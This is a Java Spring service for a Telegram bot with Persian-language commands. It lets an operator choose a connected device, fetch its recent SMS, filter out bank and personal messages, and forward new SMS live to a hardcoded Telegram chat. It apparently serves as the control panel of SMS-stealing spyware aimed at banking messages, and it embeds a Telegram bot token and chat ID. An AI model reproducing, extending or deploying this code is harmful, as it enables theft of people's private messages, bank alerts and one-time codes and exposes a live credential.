package com.mmt.telegramsmsbot.service;

import com.mmt.telegramsmsbot.model.SMSMessage;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.stereotype.Service;
import org.springframework.scheduling.annotation.Scheduled;

import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.util.*;
import java.util.concurrent.ConcurrentHashMap;

@Service
public class TelegramBotService {

    @Value("${telegram.bot.token:8279388063:AAHKKo1TJkow5bT_tvpboIzWz1VQz_KcIwU}")
    private String botToken;

    @Value("${telegram.chat.id:6361426190}")
    private String chatId;

    private final Map<String, String> userSessions = new ConcurrentHashMap<>();
    private final Map<String, Boolean> liveModeSessions = new ConcurrentHashMap<>();
    private final List<String> connectedUsers = Collections.synchronizedList(new ArrayList<>());
    private final SMSService smsService;

    public TelegramBotService() {
        this.smsService = new SMSService();
        connectedUsers.add("Server-Device");
    }

    public void processUpdate(Map<String, Object> update) {
        try {
            if (update.containsKey("message")) {
                Map<String, Object> message = (Map<String, Object>) update.get("message");
                if (message.containsKey("text")) {
                    String command = (String) message.get("text");
                    String userId = String.valueOf(((Map<String, Object>) message.get("from")).get("id"));
                    handleCommand(command.trim(), userId);
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void handleCommand(String command, String userId) {
        String response = "";
        String selectedUser = userSessions.get(userId);
        
        switch (command) {
            case "/start":
                response = "🤖 سلام! ربات SMS فعال شد.\n\nدستورات موجود:\n" +
                          "🔄 /MMT - انتخاب کاربر\n" +
                          "📱 /P100 - 100 پیامک اخیر\n" +
                          "🏦 /Bank - پیامک‌های بانکی\n" +
                          "👤 /Personal - پیامک‌های شخصی\n" +
                          "🔍 /Search - جستجو در پیامک‌ها\n" +
                          "📡 /Live - حالت زنده\n" +
                          "❌ /StopLive - توقف حالت زنده\n" +
                          "📊 /status - وضعیت ربات";
                break;

            case "/MMT":
                response = "لطفا یوزر کاربر مورد نظر را انتخاب کنید:\n\n";
                if (connectedUsers.isEmpty()) {
                    response += "❌ هیچ کاربری متصل نیست!";
                } else {
                    for (String user : connectedUsers) {
                        response += "👤 `" + user + "`\n";
                    }
                    response += "\n💡 روی یوزر مورد نظر کلیک کنید";
                }
                break;

            case "/P100":
                if (selectedUser == null) {
                    response = "❌ ابتدا با دستور /MMT یک کاربر انتخاب کنید!";
                } else {
                    response = smsService.readMessages(100, "all", selectedUser);
                }
                break;

            case "/Bank":
                if (selectedUser == null) {
                    response = "❌ ابتدا با دستور /MMT یک کاربر انتخاب کنید!";
                } else {
                    response = smsService.readMessages(50, "bank", selectedUser);
                }
                break;

            case "/Personal":
                if (selectedUser == null) {
                    response = "❌ ابتدا با دستور /MMT یک کاربر انتخاب کنید!";
                } else {
                    response = smsService.readMessages(50, "personal", selectedUser);
                }
                break;

            case "/Live":
                if (selectedUser == null) {
                    response = "❌ ابتدا با دستور /MMT یک کاربر انتخاب کنید!";
                } else {
                    liveModeSessions.put(userId, true);
                    response = "📡 حالت زنده فعال شد!\n\nپیامک‌های جدید خودکار ارسال می‌شود.\nبرای خاموش کردن /StopLive بزنید.";
                }
                break;

            case "/StopLive":
                liveModeSessions.put(userId, false);
                response = "📡 حالت زنده خاموش شد.";
                break;

            case "/status":
                response = getStatusMessage();
                break;

            default:
                if (connectedUsers.contains(command)) {
                    userSessions.put(userId, command);
                    response = "✅ کاربر `" + command + "` انتخاب شد!\n\n" +
                              "دستورات موجود:\n📱 /P100\n🏦 /Bank\n👤 /Personal\n" +
                              "🔍 /Search\n📡 /Live\n🔄 /MMT";
                } else {
                    response = "❌ دستور نامعتبر: `" + command + "`\n\n🔄 /MMT - انتخاب کاربر";
                }
                break;
        }
        
        sendMessage(response);
    }

    private String getStatusMessage() {
        return "📊 وضعیت ربات:\n\n" +
               "🤖 ربات: فعال ✅\n" +
               "👥 کاربران متصل: " + connectedUsers.size() + "\n" +
               "📡 حالت زنده: " + (liveModeSessions.containsValue(true) ? "فعال" : "غیرفعال") + "\n" +
               "⏰ آخرین بررسی: " + new Date();
    }

    public boolean setWebhook(String webhookUrl) {
        try {
            String urlString = "https://api.telegram.org/bot" + botToken + "/setWebhook";
            URL url = new URL(urlString);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setDoOutput(true);
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");

            String data = "url=" + URLEncoder.encode(webhookUrl, "UTF-8");
            try (OutputStreamWriter writer = new OutputStreamWriter(conn.getOutputStream())) {
                writer.write(data);
                writer.flush();
            }

            int responseCode = conn.getResponseCode();
            return responseCode == 200;
        } catch (Exception e) {
            e.printStackTrace();
            return false;
        }
    }

    public void sendMessage(String messageText) {
        try {
            String message = messageText;
            if (message.length() > 3500) {
                message = message.substring(0, 3400) + "...\n\n[پیام کوتاه شد]";
            }

            String urlString = "https://api.telegram.org/bot" + botToken + "/sendMessage";
            URL url = new URL(urlString);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setDoOutput(true);
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");

            String parseMode = "";
            if (message.length() < 2000 && message.contains("`")) {
                parseMode = "&parse_mode=Markdown";
            }

            String data = "chat_id=" + chatId + 
                         "&text=" + URLEncoder.encode(message, "UTF-8") + parseMode;

            try (OutputStreamWriter writer = new OutputStreamWriter(conn.getOutputStream())) {
                writer.write(data);
                writer.flush();
            }

            try (BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()))) {
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public Map<String, Object> getStatus() {
        Map<String, Object> status = new HashMap<>();
        status.put("bot_active", true);
        status.put("connected_users", connectedUsers.size());
        status.put("live_sessions", liveModeSessions.size());
        status.put("last_check", new Date());
        return status;
    }
}
